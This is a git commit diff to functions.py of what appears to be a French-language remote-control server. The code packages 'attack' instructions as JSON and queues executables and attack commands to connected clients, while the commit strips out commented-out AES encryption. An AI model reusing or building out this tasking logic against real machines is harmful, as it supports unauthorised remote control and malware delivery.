b5640bf947ac14873245460b79e6b33fc6635751
Yannis <yanis.zribi@gmail.com>
2024-06-22 00:35:38 +0200

    fix du problème de première connexion quand le serveur est down

--- functions.py
+++ functions.py
@@ -20,28 +20,14 @@ from queue import Queue, Empty
 
 
 def format_attack_data(type, id, data):
-
-    # json_data = json.loads('{"id":"'+str(id)+'","attack":"'+type+'"}')
-
-
-    # print("\t\t(+) data : " + str(data))
-    # json_data.update(data)
-
-    # print("\t\t(+) data formed as json")
-
-    # return str(json_data)
-
+    
     json_data = {
         "id": str(id),
         "attack": type
     }
 
-    # print("\t\t(+) data : " + str(data))
-    
     # Update the dictionary with additional data
     json_data.update(data)
-
-    # print("\t\t(+) data formed as json")
 
     # Convert the dictionary to a JSON string
     json_string = json.dumps(json_data)
@@ -62,37 +48,9 @@ def send_executable_to_client(attack_type, client_os, client_sym_key, client_iv,
         with open(executable_path, 'rb') as f:
             executable_data = f.read()
         
-        # Chiffrer l'exécutable
-        # cipher = AES.new(client_sym_key, AES.MODE_CBC, iv=client_iv)
-        # file_encrypted = cipher.encrypt(pad(executable_data, AES.block_size))
-
-
-        # Envois de la taille
-        # len_file_encrypted = len(file_encrypted)
-        # print("\t[+] Envoi de la taille de l'executable :", len_file_encrypted)
-
-        # cipher_file_size = AES.new(client_sym_key, AES.MODE_CBC, iv=client_iv)
-        # file_size_encrypted = cipher_file_size.encrypt(pad(str(len_file_encrypted).encode(), AES.block_size))
-        # client_emission_queue.put(file_size_encrypted)
-
-
-        # Réception de la taille de l'éxécutable reçu par le client
-        # encrypted_data_received = client_reception_queue.get(timeout=3)
-        
-        # cipher_len_buffer= AES.new(client_sym_key, AES.MODE_CBC, iv=client_iv)
-        # decrypt_size = unpad(cipher_len_buffer.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')
-
-        # print("\t[+] Reception de la taille :", decrypt_size)
-
-        # Compare si la taille de l'éxécutable envoyé à bien était reçu par le client
-        # if int(len_file_encrypted) == int(decrypt_size) :
-
-        #Envoi du fichier
             client_emission_queue.put(executable_data)
             print("\t[+] L'exécutable a été envoyé")
 
-        # else:
-        #     print("\t[!] Les tailles ne correspondent pas.")
                         
     else:
         print("\t[!] L'exécutable n'a pas été trouvé sur le serveur")
@@ -110,23 +68,9 @@ def execute_attack(client, attack):
 
     data_to_send = format_attack_data(attack_type, attack_id, attack_data)
 
-    # Envoi de l'attaque à l'ordinateur
-    # cipher_enc = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
-    # cipher_text = cipher_enc.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
 
     print("\t[+] data_to_send : " + str(data_to_send))
 
     client['emission_queue'].put(data_to_send.encode())
 
     print("\t[+] instruction envoyée")
-
-    #### fin
-
-    # reception du message retourner par le client 
-    
-
-    
-    # Recevoir le status final de l'envoi de l'exécutable
-    # encrypted_final_status = client['reception_queue'].get()
-    # final_status = unpad(cipher.decrypt(encrypted_final_status), AES.block_size).decode('utf-8')
-    # print(f"Statu final de l'attaque sur le client {client['addr']}: {final_status}")
